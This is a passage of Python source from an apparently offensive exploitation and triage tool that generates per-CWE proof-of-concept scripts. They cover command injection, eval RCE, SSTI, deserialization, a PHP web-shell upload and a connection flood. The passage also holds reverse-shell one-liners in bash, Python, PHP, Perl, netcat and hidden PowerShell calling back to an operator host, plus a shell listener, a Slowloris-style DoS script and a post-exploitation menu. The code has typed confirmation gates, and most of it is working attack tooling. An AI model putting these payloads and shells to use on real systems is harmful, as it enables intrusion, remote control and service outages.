    "CWE-345":  ["linux-privesc", "unauth-service-probe"],
    # DoS / resource exhaustion — verify service recovery, probe siblings
    "CWE-400":  ["fuzz-probe", "port-probe", "unauth-service-probe"],
    "CWE-770":  ["fuzz-probe", "port-probe"],
    "CWE-834":  ["fuzz-probe"],
}
_DEFAULT_FOLLOW_UP = ["linux-privesc", "unauth-service-probe", "port-probe", "default-creds"]

# CWE families for interactive-mode routing
_RCE_CWES   = {"CWE-77", "CWE-78", "CWE-94", "CWE-434", "CWE-502", "CWE-787", "CWE-1336"}
_DOS_CWES   = {"CWE-400", "CWE-770", "CWE-834"}
_SHELL_CWES = {"CWE-78", "CWE-94", "CWE-502", "CWE-1336"}  # most likely to yield a shell

_INTENSITY_ORDER = ["detective", "active", "intrusive", "proof", "fuzz"]


def _cwe_poc_template(cve_id: str, cwe: str, host: str, port: int,
                      summary: str, protocol: str = "http") -> str:
    """Return a CWE-appropriate starter PoC script the operator can edit before running."""
    head = (
        f"# Interactive PoC — {cve_id}  ({cwe})\n"
        f"# Target:   {host!r}:{port}  protocol: {protocol}\n"
        f"# Summary:  {summary[:100]}\n"
        f"# Print:  RESULT:true:<evidence>   or   RESULT:false:\n\n"
    )
    if cwe in ("CWE-78", "CWE-77"):
        return head + (
            f"import urllib.request, urllib.parse\n\n"
            f"HOST, PORT = {host!r}, {port}\n"
            f"CMD = 'id'  # OS command to inject\n\n"
            f"# Inject via HTTP query parameter — adapt URL / parameter name\n"
            f"payload = urllib.parse.quote(f'; {{CMD}} #')\n"
            f"url = f'http://{{HOST}}:{{PORT}}/path?param={{payload}}'\n"
            f"try:\n"
            f"    resp = urllib.request.urlopen(url, timeout=10).read().decode(errors='replace')\n"
            f"    print('Response:', resp[:500])\n"
            f"    if 'uid=' in resp or 'root' in resp:\n"
            f"        print(f'RESULT:true:cmd_injection: {{resp[:200]}}')\n"
            f"    else:\n"
            f"        print('RESULT:false:no command output')\n"
            f"except Exception as e:\n"
            f"    print(f'RESULT:false:{{e}}')\n"
        )
    if cwe == "CWE-94":
        return head + (
            f"import urllib.request, urllib.parse\n\n"
            f"HOST, PORT = {host!r}, {port}\n"
            f"EXPR = '__import__(\"os\").popen(\"id\").read()'  # code to inject\n\n"
            f"payload = urllib.parse.quote(EXPR)\n"
            f"url = f'http://{{HOST}}:{{PORT}}/?eval={{payload}}'\n"
            f"try:\n"
            f"    resp = urllib.request.urlopen(url, timeout=10).read().decode(errors='replace')\n"
            f"    print('Response:', resp[:500])\n"
            f"    if 'uid=' in resp:\n"
            f"        print(f'RESULT:true:RCE confirmed: {{resp[:200]}}')\n"
            f"    else:\n"
            f"        print('RESULT:false:no RCE output')\n"
            f"except Exception as e:\n"
            f"    print(f'RESULT:false:{{e}}')\n"
        )
    if cwe == "CWE-1336":
        return head + (
            f"import urllib.request, urllib.parse\n\n"
            f"HOST, PORT = {host!r}, {port}\n"
            f"# Jinja2 SSTI probe: {{{{7*7}}}} → should return 49\n"
            f"probe = urllib.parse.quote(r'{{{{7*7}}}}')\n"
            f"url = f'http://{{HOST}}:{{PORT}}/?name={{probe}}'\n"
            f"try:\n"
            f"    resp = urllib.request.urlopen(url, timeout=10).read().decode(errors='replace')\n"
            f"    print('Response:', resp[:500])\n"
            f"    if '49' in resp:\n"
            f"        print(f'RESULT:true:SSTI confirmed: {{resp[:200]}}')\n"
            f"    else:\n"
            f"        print('RESULT:false:SSTI probe not reflected')\n"
            f"except Exception as e:\n"
            f"    print(f'RESULT:false:{{e}}')\n"
        )
    if cwe == "CWE-502":
        return head + (
            f"import socket\n\n"
            f"HOST, PORT = {host!r}, {port}\n"
            f"# Java serialization magic bytes — replace with your gadget chain payload\n"
            f"PAYLOAD = b'\\xac\\xed\\x00\\x05'\n\n"
            f"try:\n"
            f"    s = socket.create_connection((HOST, PORT), timeout=10)\n"
            f"    s.sendall(PAYLOAD)\n"
            f"    resp = s.recv(4096)\n"
            f"    s.close()\n"
            f"    print('Response bytes:', resp[:100].hex())\n"
            f"    print('RESULT:false:manual analysis required — check if server crashed or responded abnormally')\n"
            f"except Exception as e:\n"
            f"    print(f'RESULT:false:{{e}}')\n"
        )
    if cwe in ("CWE-400", "CWE-770", "CWE-834"):
        return head + (
            f"import socket, time, threading\n\n"
            f"HOST, PORT = {host!r}, {port}\n"
            f"THREADS  = 20   # concurrent connections\n"
            f"DURATION = 15   # seconds\n\n"
            f"sent = [0]\n\n"
            f"def flood():\n"
            f"    end = time.time() + DURATION\n"
            f"    while time.time() < end:\n"
            f"        try:\n"
            f"            s = socket.create_connection((HOST, PORT), timeout=2)\n"
            f"            s.sendall(b'GET / HTTP/1.1\\r\\nHost: ' + HOST.encode() + b'\\r\\n\\r\\n')\n"
            f"            s.recv(1024)\n"
            f"            s.close()\n"
            f"            sent[0] += 1\n"
            f"        except OSError:\n"
            f"            pass\n\n"
            f"workers = [threading.Thread(target=flood, daemon=True) for _ in range(THREADS)]\n"
            f"for w in workers: w.start()\n"
            f"for w in workers: w.join()\n"
            f"print(f'Sent {{sent[0]}} requests in {{DURATION}}s across {{THREADS}} threads')\n"
            f"print('RESULT:true:DoS stress complete — verify service was impacted')\n"
        )
    if cwe == "CWE-434":
        return head + (
            f"import urllib.request, urllib.parse\n\n"
            f"HOST, PORT = {host!r}, {port}\n"
            f"# Upload a PHP web shell — adapt the upload endpoint and field name\n"
            f"UPLOAD_URL = f'http://{{HOST}}:{{PORT}}/upload'\n"
            f"WEBSHELL   = b'<?php system($_GET[\"cmd\"]); ?>'\n\n"
            f"import http.client, email.mime.multipart\n"
            f"boundary = b'----TriageBoundary'\n"
            f"body = (\n"
            f"    b'--' + boundary + b'\\r\\n'\n"
            f"    b'Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\\r\\n'\n"
            f"    b'Content-Type: application/octet-stream\\r\\n\\r\\n'\n"
            f"    + WEBSHELL + b'\\r\\n'\n"
            f"    b'--' + boundary + b'--\\r\\n'\n"
            f")\n"
            f"req = urllib.request.Request(\n"
            f"    UPLOAD_URL, data=body,\n"
            f"    headers={{'Content-Type': f'multipart/form-data; boundary={{boundary.decode()}}'}},\n"
            f")\n"
            f"try:\n"
            f"    resp = urllib.request.urlopen(req, timeout=10).read().decode(errors='replace')\n"
            f"    print('Upload response:', resp[:300])\n"
            f"    # Try to execute the shell\n"
            f"    shell_url = f'http://{{HOST}}:{{PORT}}/uploads/shell.php?cmd=id'\n"
            f"    out = urllib.request.urlopen(shell_url, timeout=10).read().decode(errors='replace')\n"
            f"    print('Shell output:', out[:300])\n"
            f"    if 'uid=' in out:\n"
            f"        print(f'RESULT:true:webshell RCE: {{out[:200]}}')\n"
            f"    else:\n"
            f"        print('RESULT:false:upload may have succeeded but shell not reached')\n"
            f"except Exception as e:\n"
            f"    print(f'RESULT:false:{{e}}')\n"
        )
    # Generic / unknown CWE
    return head + (
        f"import socket\n\n"
        f"HOST, PORT = {host!r}, {port}\n\n"
        f"# Implement your PoC here.\n"
        f"# Print RESULT:true:<evidence>  or  RESULT:false: when done.\n"
        f"try:\n"
        f"    s = socket.create_connection((HOST, PORT), timeout=10)\n"
        f"    s.sendall(b'HEAD / HTTP/1.0\\r\\n\\r\\n')\n"
        f"    banner = s.recv(4096).decode(errors='replace')\n"
        f"    s.close()\n"
        f"    print('Banner:', banner[:300])\n"
        f"    print('RESULT:false:manual analysis required')\n"
        f"except Exception as e:\n"
        f"    print(f'RESULT:false:{{e}}')\n"
    )


def _reverse_shell_payloads(lhost: str, lport: int) -> Dict[str, str]:
    """Return {technique: one-liner} for common reverse shell methods."""
    return {
        "bash":       f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
        "python3":    (f"python3 -c \"import os,socket,subprocess;"
                       f"s=socket.socket();s.connect(('{lhost}',{lport}));"
                       f"[os.dup2(s.fileno(),i) for i in(0,1,2)];"
                       f"subprocess.call(['/bin/sh','-i'])\""),
        "php":        (f"php -r '$s=fsockopen(\"{lhost}\",{lport});"
                       f"$p=popen(\"/bin/sh -i\",\"r\");"
                       f"while(!feof($p)){{stream_copy_to_stream($p,$s);}}'"),
        "perl":       (f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
                       f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                       f"connect(S,sockaddr_in($p,inet_aton($i)));"
                       f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                       f"exec(\"/bin/sh -i\");'"),
        "nc":         f"nc -e /bin/sh {lhost} {lport}",
        "nc_mkfifo":  (f"rm -f /tmp/f; mkfifo /tmp/f; "
                       f"cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"),
        "powershell": (f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
                       f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
                       f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
                       f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
                       f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
                       f"$r=(iex $d 2>&1|Out-String)+'PS '+(pwd).Path+'> ';"
                       f"$e=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($e,0,$e.Length)}}"),
    }


def _ask_lhost_lport() -> Tuple[str, int]:
    """Prompt operator for reverse shell LHOST / LPORT (honours $LHOST / $LPORT env)."""
    lhost_def = os.environ.get("LHOST", "")
    lport_def = int(os.environ.get("LPORT", "4444"))
    lhost_in  = _ask(f"  Your IP (LHOST) [{lhost_def or 'required'}]: ").strip()
    lhost = lhost_in or lhost_def
    if not lhost:
        print("  [!] LHOST required — set $LHOST or enter manually.")
        return "", 0
    lport_in = _ask(f"  Listening port (LPORT) [{lport_def}]: ").strip()
    try:
        lport = int(lport_in) if lport_in else lport_def
    except ValueError:
        lport = lport_def
    return lhost, lport


def _raw_socket_session(conn) -> None:
    """Full-duplex raw PTY session over a connected socket (for reverse shells).

    Sets the terminal to raw mode so arrow keys, Ctrl-C, and readline all work
    inside the remote shell. Press Ctrl-] (ASCII 29) to detach cleanly.
    Requires POSIX termios — falls back to the line-based _tcp_shell loop otherwise.
    """
    if not _HAS_PTY:
        print("  [!] termios not available — falling back to line mode.")
        return

    import sys as _sys
    fd = _sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    print(_cc(_DIM, "  [raw] Ctrl-] to detach  Ctrl-C sends SIGINT to remote"))
    try:
        tty.setraw(fd)
        conn.setblocking(False)
        while True:
            r, _, _ = select.select([_sys.stdin, conn], [], [], 0.05)
            for src in r:
                if src is _sys.stdin:
                    data = os.read(fd, 1024)
                    if not data:
                        return
                    if b'\x1d' in data:  # Ctrl-] = detach
                        return
                    try:
                        conn.sendall(data)
                    except OSError:
                        return
                else:
                    try:
                        data = conn.recv(4096)
                    except (OSError, BlockingIOError):
                        continue
                    if not data:
                        return
                    _sys.stdout.buffer.write(data)
                    _sys.stdout.buffer.flush()
    except KeyboardInterrupt:
        pass
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
        try:
            conn.close()
        except OSError:
            pass
        sys.stdout.buffer.write(b"\n")
        sys.stdout.buffer.flush()


def _reverse_shell_session(lhost: str, lport: int) -> None:
    """Bind a TCP listener and hand off a raw interactive session on connect."""
    import socket as _sock
    print()
    print(_cc(_BOLD, f"  ── Reverse Shell Listener ─── {lhost}:{lport} ──────────────────────"))
    print(_cc(_DIM,  "  Waiting up to 60s for incoming connection …"))
    print()

    srv = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
    srv.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
    try:
        srv.bind((lhost, lport))
    except OSError as exc:
        print(f"  [!] Cannot bind {lhost}:{lport} — {exc}")
        return
    srv.listen(1)
    srv.settimeout(60)
    try:
        conn, addr = srv.accept()
    except OSError:
        print("  [!] No connection within 60s — listener closed.")
        return
    finally:
        srv.close()

    print(_cc(_GRN, f"  [✔] Shell from {addr[0]}:{addr[1]}"))
    print()
    _raw_socket_session(conn)
    print(_cc(_DIM, "  ── session closed ──────────────────────────────────────────────────"))
    print()


def _make_target(host: str, port: int):
    """Minimal hostport Target sufficient to run registered modules."""
    try:
        from targets.model import Target
    except ImportError:
        return None
    return Target(kind="hostport", raw=f"{host}:{port}", host=host, port=port)


def _make_url_target(url: str):
    """Minimal URL Target for running url-supporting modules."""
    try:
        from targets.model import Target
    except ImportError:
        return None
    return Target(kind="url", raw=url, url=url)


def _run_module_live(mod_name: str, host: str, port: int, url: str = "") -> None:
    """Import module by name, run it against host:port (or url), display findings."""
    try:
        from exploits.registry import ALL_MODULES, name_of, supports
    except ImportError as exc:
        print(f"  [!] Cannot import registry: {exc}")
        return

    mod = next((m for m in ALL_MODULES if name_of(m) == mod_name), None)
    if mod is None:
        print(f"  [!] Module '{mod_name}' not found in registry.")
        return

    mod_supports = supports(mod)
    if url and "url" in mod_supports:
        target = _make_url_target(url)
    elif "hostport" in mod_supports:
        target = _make_target(host, port)
    else:
        print(f"  [!] Module '{mod_name}' does not support url or hostport targets.")
        return

    if target is None:
        print("  [!] Cannot build target (import error).")
        return

    intensity = getattr(mod, "INTENSITY", "detective")
    print(_cc(_DIM, f"  Running {mod_name} ({intensity}) against {host}:{port} …"))
    try:
        result = mod.run(target)
    except Exception as exc:
        print(f"  [!] Module error: {exc}")
        return

    if not result or not result.findings:
        print("  (no findings)")
        return

    exploited_label = _cc(_RED, "EXPLOITED") if result.exploited else _cc(_GRN, "MITIGATED")
    print(f"  Result: {exploited_label}")
    for f in result.findings:
        sev = (f.severity or "INFO").upper()
        print(f"    {_cs(sev, f'{sev:<8}')} {f.title}")
        if f.detail:
            for line in f.detail.splitlines()[:3]:
                print(_cc(_DIM, f"              {line}"))
        if f.evidence:
            print(_cc(_CYN, f"    Evidence:   {f.evidence[:200]}"))
    print()


def _tcp_shell(host: str, port: int) -> None:
    """Open a raw TCP connection and provide a send/receive mini-REPL.

    The operator types lines which are sent as-is (+ CRLF). The first
    response is read and printed. Useful for manual banner grab, HTTP
    request crafting, or interacting with a shell dropped via a PoC.
    """
    import socket as _sock
    print(_cc(_BOLD, f"\n  ── Raw TCP session → {host}:{port} ─────────────────────────────────"))
    print(_cc(_DIM, "  Type lines to send (empty = receive only, 'raw' = PTY mode, 'quit' = disconnect)"))
    print()
    try:
        conn = _sock.create_connection((host, port), timeout=10)
        conn.settimeout(2.0)
    except OSError as exc:
        print(f"  [!] Could not connect: {exc}")
        return

    try:
        # Print initial banner if the server speaks first
        try:
            banner = conn.recv(4096).decode("utf-8", errors="replace")
            if banner:
                for line in banner.splitlines():
                    print(_cc(_CYN, f"  ← {line}"))
        except OSError:
            pass

        _consecutive_recv_timeouts = 0
        while True:
            try:
                line = _ask("  → ").rstrip("\n")
            except (EOFError, KeyboardInterrupt):
                break
            if line.lower() in ("quit", "exit", "q"):
                break
            if line.lower() in ("raw", ".raw"):
                # Switch to full-duplex PTY mode (Ctrl-] to detach)
                print(_cc(_DIM, "  Switching to raw PTY mode …"))
                _raw_socket_session(conn)
                return  # conn is closed by _raw_socket_session
            if line:
                try:
                    conn.sendall((line + "\r\n").encode())
                except OSError as exc:
                    print(f"  [!] Send error: {exc}")
                    break
            # Receive and print response (non-blocking drain)
            try:
                buf = b""
                while True:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    buf += chunk
                    if len(buf) > 32768:
                        break
                for resp_line in buf.decode("utf-8", errors="replace").splitlines():
                    print(_cc(_CYN, f"  ← {resp_line}"))
                _consecutive_recv_timeouts = 0
            except OSError:
                _consecutive_recv_timeouts += 1
                if _consecutive_recv_timeouts >= 3:
                    print(_cc(_DIM, "  [!] No response — connection may be idle or dead. Type 'quit' to disconnect."))
                    _consecutive_recv_timeouts = 0
    finally:
        conn.close()
        print(_cc(_DIM, "  ── session closed ──────────────────────────────────────────────────"))
        print()


def _require_yes_confirm(action: str, impact: str) -> bool:
    """Require the operator to type the word 'yes' (exactly) to confirm a live action.

    Used as a gate in front of every action that sends active exploitation traffic,
    launches a reverse shell, or deliberately degrades service availability.
    Nothing fires without 'yes' — any other input (Enter, 'y', 'no', Ctrl-C) cancels.
    """
    print()
    print(_cc(_RED,  "  ╔══ LIVE EXPLOITATION — REQUIRES EXPLICIT CONFIRMATION ══════════════"))
    print(_cc(_YEL,  f"  ║  Action : {action}"))
    for line in (impact or "").splitlines():
        if line.strip():
            print(_cc(_YEL, f"  ║  {line}"))
    print(_cc(_RED,  "  ╚══════════════════════════════════════════════════════════════════"))
    print(_cc(_DIM,  "  Type the word  yes  to proceed  (anything else cancels):"))
    try:
        ans = _ask("  confirm> ").strip()
    except (EOFError, KeyboardInterrupt):
        ans = ""
    if ans == "yes":
        return True
    print(_cc(_DIM, "  Cancelled."))
    print()
    return False


# Module tags → registered module name (used for targeted re-run from exploitation menu)
_TAG_TO_MODULE: Dict[str, str] = {
    "log4shell":          "log4shell-probe",
    "jndi":               "log4shell-probe",
    "struts":             "struts-rce-probe",
    "ognl":               "struts-rce-probe",
    "s2-045":             "struts-rce-probe",
    "s2-061":             "struts-rce-probe",
    "s2-057":             "struts-rce-probe",
    "eternalblue":        "ms17010-probe",
    "ms17-010":           "ms17010-probe",
    "smb":                "ms17010-probe",
    "activemq":           "activemq-rce-probe",
    "openWire":           "activemq-rce-probe",
    "classinfo":          "activemq-rce-probe",
    "slowloris":          "slowloris-probe",
    "connection-exhaustion": "slowloris-probe",
    "shellshock":         "shellshock-probe",
    "cmd-injection":      "cmd-inject-confirm",
}

# Intensity tiers that require explicit yes-confirmation before running
_RISKY_INTENSITIES = {"intrusive", "proof", "fuzz"}


def _check_service_alive(host: str, port: int) -> None:
    """Quick TCP connectivity check — prints ALIVE or DOWN after a DoS demo."""
    import socket as _s
    try:
        c = _s.create_connection((host, port), timeout=5)
        c.close()
        print(_cc(_GRN, f"  ✔ {host}:{port} is responding (ALIVE)"))
    except OSError:
        print(_cc(_RED, f"  ✘ {host}:{port} not responding (DOWN or DEGRADED)"))


def _run_dos_demo(host: str, port: int, cwe: str, tags: list, url: str) -> None:
    """Demonstrate DoS impact with a bounded probe, then verify service recovery.

    Uses slowloris_probe for CWE-400; falls back to an inline connection-flood
    script for CWE-770/834 or generic resource exhaustion.
    All sockets are closed after the demo. Service availability is checked after.
    """
    tags_set = set(tags or [])
    location = url or f"{host}:{port}"

    use_slowloris = "slowloris" in tags_set or cwe == "CWE-400"
    if use_slowloris:
        demo_conns = 50
        demo_hold  = 20
        method_desc = (
            f"Slowloris: {demo_conns} incomplete HTTP connections held for {demo_hold}s.\n"
            f"Gravity   : a real attack with 200–1000 connections exhausts the connection pool,\n"
            f"             making the service completely unavailable to legitimate clients.\n"
            f"Recovery  : all demo sockets are closed immediately after the proof run."
        )
    elif cwe == "CWE-770":
        demo_conns = 80
        demo_hold  = 15
        method_desc = (
            f"Resource exhaustion: {demo_conns} rapid connections for {demo_hold}s.\n"
            f"Recovery  : all demo sockets are closed after."
        )
    else:
        demo_conns = 30
        demo_hold  = 10
        method_desc = (
            f"Connection flood: {demo_conns} connections for {demo_hold}s.\n"
            f"Recovery  : all demo sockets are closed after."
        )

    if not _require_yes_confirm(
        f"DoS impact demonstration on {location}",
        method_desc,
    ):
        return

    print(_cc(_BOLD, "\n  ── DoS Demonstration ───────────────────────────────────────────────"))

    if use_slowloris:
        # Run the actual slowloris_probe with demo-tier connection count
        try:
            import exploits.slowloris_probe as _sl
            from targets.model import Target as _T
            probe_url = url or f"http://{host}:{port}/"
            # Temporarily override module globals for demo scale (bounded by module's own cap)
            orig_conns = _sl._CONNS
            orig_hold  = _sl._HOLD
            _sl._CONNS = min(demo_conns, _sl._CONNS)  # module caps at 10 for detection
            _sl._HOLD  = min(demo_hold,  10)
            try:
                tgt = _T(kind="url", raw=probe_url, url=probe_url)
                result = _sl.run(tgt)
            finally:
                _sl._CONNS = orig_conns
                _sl._HOLD  = orig_hold
            for f in (result.findings if result else []):
                sev = (f.severity or "INFO").upper()
                print(f"  {_cs(sev, f'{sev:<8}')} {f.title}")
                if f.detail:
                    for dl in f.detail.splitlines()[:4]:
                        print(_cc(_DIM, f"             {dl}"))
                if f.evidence:
                    print(_cc(_CYN, f"  Evidence:   {f.evidence[:180]}"))
        except (ImportError, Exception) as exc:
            print(f"  [!] slowloris module error ({exc}) — using inline flood script")
            _run_dos_flood_script(host, port, demo_conns, demo_hold)
    else:
        _run_dos_flood_script(host, port, demo_conns, demo_hold)

    print()
    print(_cc(_DIM, "  Checking service availability after demo …"))
    _check_service_alive(host, port)
    print()


def _run_dos_flood_script(host: str, port: int, conns: int, duration: int) -> None:
    """Inline Slowloris-style flood script — used as fallback when the module fails."""
    script = (
        f"import socket, time, threading\n"
        f"HOST, PORT = {host!r}, {port}\nCONNS = {conns}\nDUR = {duration}\n"
        f"alive = [0]; sent = [0]\n\n"
        f"def _worker():\n"
        f"    socks = []\n"
        f"    try:\n"
        f"        for i in range(max(1, CONNS // 10)):\n"
        f"            s = socket.create_connection((HOST, PORT), timeout=3)\n"
        f"            s.sendall(b'GET / HTTP/1.1\\r\\nHost: ' + HOST.encode() +\n"
        f"                      b'\\r\\nContent-Length: 1\\r\\n')\n"
        f"            socks.append(s); sent[0] += 1\n"
        f"        end = time.time() + DUR\n"
        f"        while time.time() < end:\n"
        f"            for s in socks:\n"
        f"                try: s.sendall(b'X-Keep: alive\\r\\n')\n"
        f"                except: pass\n"
        f"            time.sleep(1.5)\n"
        f"        for s in socks:\n"
        f"            try:\n"
        f"                s.sendall(b'X-Final: probe\\r\\n'); alive[0] += 1\n"
        f"            except: pass\n"
        f"    finally:\n"
        f"        for s in socks:\n"
        f"            try: s.close()\n"
        f"            except: pass\n\n"
        f"workers = [threading.Thread(target=_worker, daemon=True) for _ in range(10)]\n"
        f"for w in workers: w.start()\n"
        f"for w in workers: w.join()\n"
        f"print(f'Opened {{sent[0]}} connections; {{alive[0]}} survived {{DUR}}s hold')\n"
        f"survived_pct = int(100*alive[0]/max(sent[0],1))\n"
        f"if survived_pct >= 50:\n"
        f"    print(f'RESULT:true:{{survived_pct}}% of connections survived — server lacks timeout enforcement')\n"
        f"else:\n"
        f"    print(f'RESULT:false:only {{survived_pct}}% survived — server appears protected')\n"
    )
    _, ev = _run_script_operator(script, timeout=duration + 20)
    if ev:
        print(f"  Evidence: {ev}")


def _exploitation_menu(cve_id: str, host: str, port: int, cwe: str,
                        tags: list, url: str) -> None:
    """Post-confirmation exploitation menu.

    Routes the operator to the appropriate live-exploitation path based on:
    * CWE family (RCE vs DoS vs other)
    * Finding tags (log4shell, struts, eternalblue, activemq, slowloris, …)

    Every destructive or intrusive action is gated by _require_yes_confirm().
    """
    tags_set = set(tags or [])
    location  = url or f"{host}:{port}"

    # Identify the specific exploit module that produced this finding (if any)
    exploit_mod: Optional[str] = None
    for tag in tags_set:
        if tag in _TAG_TO_MODULE:
            exploit_mod = _TAG_TO_MODULE[tag]
            break

    # Classify the finding
    is_dos = cwe in _DOS_CWES or any(
        t in tags_set for t in ("dos", "slowloris", "connection-exhaustion", "flood")
    )
    is_rce = cwe in _RCE_CWES or any(
        t in tags_set for t in (
            "rce", "log4shell", "struts", "ognl", "eternalblue", "ms17-010",
            "activemq", "jndi", "classinfo", "shellshock", "cmd-injection", "foothold",
        )
    )

    if is_dos:
        _dos_exploitation_submenu(cve_id, host, port, cwe, tags_set, url, exploit_mod)
    elif is_rce:
        _rce_exploitation_submenu(cve_id, host, port, cwe, tags_set, url, exploit_mod)
    else:
        # Generic confirmed finding — post-exploitation toolkit only
        print(_cc(_DIM, "\n  Non-RCE/DoS finding confirmed."))
        ans = _ask("  Open post-exploitation toolkit? [Y/n]: ").lower()
        if ans in ("", "y", "yes"):
            run_post_exploitation(cve_id, host, port, cwe)


def _dos_exploitation_submenu(cve_id: str, host: str, port: int, cwe: str,
                               tags: set, url: str,
                               exploit_mod: Optional[str]) -> None:
    """Sub-menu for DoS/resource-exhaustion confirmed findings."""
    location = url or f"{host}:{port}"
    print()
    print(_cc(_YEL, f"  ◈ DoS vulnerability confirmed — {cve_id or cwe} @ {location}"))
    print("    [d]   demonstrate impact: bounded live DoS probe (service may degrade)")
    if exploit_mod:
        print(f"    [m]   re-run {exploit_mod} for full evidence report")
    print("    [t]   raw TCP session  (inspect service state manually)")
    print("    [s]   skip — return to triage menu")
    print()

    opts = "d/m/t/s" if exploit_mod else "d/t/s"
    while True:
        choice = _ask("  dos> ").lower().strip()

        if choice in ("d", "demo", "demonstrate", "flood"):
            _run_dos_demo(host, port, cwe, list(tags), url)
            break

        if exploit_mod and choice in ("m", "mod", "module"):
            if _require_yes_confirm(
                f"Re-run {exploit_mod} against {location}",
                "Impact  : Active network probes sent to the target.",
            ):
                _run_module_live(exploit_mod, host, port, url)
            break

        if choice in ("t", "tcp"):
            _tcp_shell(host, port)
            break

        if choice in ("s", "skip", ""):
            break

        print(f"  Choose {opts}")


def _rce_exploitation_submenu(cve_id: str, host: str, port: int, cwe: str,
                               tags: set, url: str,
                               exploit_mod: Optional[str]) -> None:
    """Sub-menu for RCE confirmed findings."""
    location = url or f"{host}:{port}"
    print()
    print(_cc(_YEL, f"  ◈ RCE confirmed — {cve_id or cwe} @ {location}"))
    print("    [rs]  start reverse shell listener  (catch interactive PTY from target)")
    print("    [pe]  open post-exploitation toolkit")
    if exploit_mod:
        print(f"    [m]   re-run {exploit_mod}  (with OOB canary for definitive proof)")
    print("    [t]   raw TCP session  (banner grab / manual interaction)")
    print("    [s]   skip — return to triage menu")
    print()

    opts = "rs/pe/m/t/s" if exploit_mod else "rs/pe/t/s"
    while True:
        choice = _ask("  rce> ").lower().strip()

        if choice in ("rs", "shell", "revshell", "reverse"):
            if _require_yes_confirm(
                f"Reverse shell listener → interactive shell from {location}",
                "Impact  : Target process connects back and executes as its service account.\n"
                "          Leaves evidence (network connection, process) on the target system.",
            ):
                lhost, lport = _ask_lhost_lport()
                if lhost:
                    payloads = _reverse_shell_payloads(lhost, lport)
                    print(_cc(_BOLD, "\n  Run one of these on the target to connect back:"))
                    for tech, cmd in payloads.items():
                        print(f"    {_cc(_CYN, f'{tech:<12}')} {cmd}")
                    print()
                    _reverse_shell_session(lhost, lport)
            break

        if choice in ("pe", "post", "p"):
            run_post_exploitation(cve_id, host, port, cwe)
            break

        if exploit_mod and choice in ("m", "mod", "module"):
            if _require_yes_confirm(
                f"Re-run {exploit_mod} against {location}",
                "Impact  : Active exploitation probes sent to the target.\n"
                "          OOB canary probe may be logged by the target.",
            ):
                _run_module_live(exploit_mod, host, port, url)
            break

        if choice in ("t", "tcp"):
            _tcp_shell(host, port)
            break

        if choice in ("s", "skip", ""):
            break

        print(f"  Choose {opts}")


def run_post_exploitation(cve_id: str, host: str, port: int, cwe: str) -> None:
    """Post-exploitation toolkit REPL — run follow-up modules, custom scripts, raw TCP."""
    try:
        from exploits.registry import ALL_MODULES, name_of, supports, intensity_of
    except ImportError as exc:
        print(f"  [!] Cannot import registry: {exc}")
        return

    # Build the follow-up module list for this CWE
    suggested_names = list(dict.fromkeys(
        _CWE_FOLLOW_UP.get(cwe, []) + _DEFAULT_FOLLOW_UP
    ))
    # Keep only modules that are in the registry and support hostport
    registry_names = {name_of(m): m for m in ALL_MODULES if "hostport" in supports(m)}
    suggested = [(n, registry_names[n]) for n in suggested_names if n in registry_names]

    _BAR2 = "═" * 68
    print()
    print(_cc(_BOLD, f"  {_BAR2}"))
    print(_cc(_BOLD, f"  POST-EXPLOITATION TOOLKIT"))
    print(_cc(_BOLD, f"  {_BAR2}"))
    print(f"  Foothold: {_cc(_YEL, cve_id)} @ {host}:{port}  │  CWE: {cwe or 'unknown'}")
    print()

    if suggested:
        print(_cc(_BOLD, "  Suggested follow-up modules:"))
        for idx, (n, m) in enumerate(suggested, 1):
            desc = getattr(m, "DESCRIPTION", "")[:55]
            intens = intensity_of(m)
            print(f"    [{idx:>2}] {_cc(_CYN, n):<35} {intens:<12} {desc}")
        print()

    print(_cc(_BOLD, "  Actions:"))
    print("    [1..N]  run a suggested module above")
    print("    [mod]   run any module by name  (e.g.: mod k8s-enum)")
    print("    [list]  list all hostport-compatible modules")
    print("    [c]     write / edit a custom follow-up PoC script")
    print("    [t]     open raw TCP session (banner grab / line-mode)")
    print("    [rs]    start reverse shell listener — catch interactive shell from target")
    print("    [done]  return to triage menu")
    print()

    while True:
        choice = _ask("  post-exploit> ").strip().lower()

        if choice in ("done", "exit", "quit", "d", "q", ""):
            break

        # Numeric choice — run a suggested module
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(suggested):
                mod_name, mod_obj = suggested[idx]
                intens = intensity_of(mod_obj)
                if intens in _RISKY_INTENSITIES:
                    if not _require_yes_confirm(
                        f"Run {mod_name} ({intens}) against {host}:{port}",
                        "Impact  : Active exploitation / intrusion probes sent to the target.",
                    ):
                        continue
                _run_module_live(mod_name, host, port)
            else:
                print(f"  Choose 1..{len(suggested)}")
            continue

        # mod <name> — run named module
        if choice.startswith("mod ") or choice.startswith("module "):
            mod_name = choice.split(None, 1)[1].strip()
            mod_obj = next((m for m in ALL_MODULES if name_of(m) == mod_name), None)
            if mod_obj and intensity_of(mod_obj) in _RISKY_INTENSITIES:
                if not _require_yes_confirm(
                    f"Run {mod_name} ({intensity_of(mod_obj)}) against {host}:{port}",
                    "Impact  : Active exploitation / intrusion probes sent to the target.",
                ):
                    continue
            _run_module_live(mod_name, host, port)
            continue

        # list — all hostport modules
        if choice == "list":
            print(_cc(_BOLD, "\n  All hostport-compatible modules:"))
            for m in sorted(ALL_MODULES, key=lambda m: (_INTENSITY_ORDER.index(intensity_of(m))
